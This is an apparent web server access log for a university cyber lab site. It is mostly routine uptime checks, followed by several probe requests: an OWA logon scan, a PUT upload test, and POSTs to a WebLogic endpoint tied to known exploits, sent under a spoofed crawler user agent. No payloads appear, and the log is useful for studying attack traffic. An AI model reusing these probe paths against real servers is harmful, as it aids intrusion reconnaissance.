45.32.107.181 - - [23/Sep/2020:12:50:20 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:4400:402e::1 - - [23/Sep/2020:12:50:20 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
91.121.222.175 - - [23/Sep/2020:12:55:17 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:41d0:2:85af::1 - - [23/Sep/2020:12:55:17 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
2001:19f0:4400:402e::1 - - [23/Sep/2020:13:00:15 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
45.32.107.181 - - [23/Sep/2020:13:00:15 +0000] "HEAD / HTTP/1.1" 200 0 "-" "updown.io daemon 2.4"
162.243.128.149 - - [23/Sep/2020:13:00:29 +0000] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 8701 "-" "Mozilla/5.0 zgrab/0.x"
60.12.124.24 - - [23/Sep/2020:13:02:30 +0000] "PUT /qpt00fov.txt HTTP/1.1" 404 40397 "https://cyberlab.pacific.edu/qpt00fov.txt" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
60.12.124.24 - - [23/Sep/2020:13:02:31 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 40397 "https://cyberlab.pacific.edu/wls-wsat/CoordinatorPortType" "Mozilla/5.0(compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
60.12.124.24 - - [23/Sep/2020:13:02:31 +0000] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 40397 "https://cyberlab.pacific.edu/wls-wsat/CoordinatorPortType" "Mozilla/5.0(compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
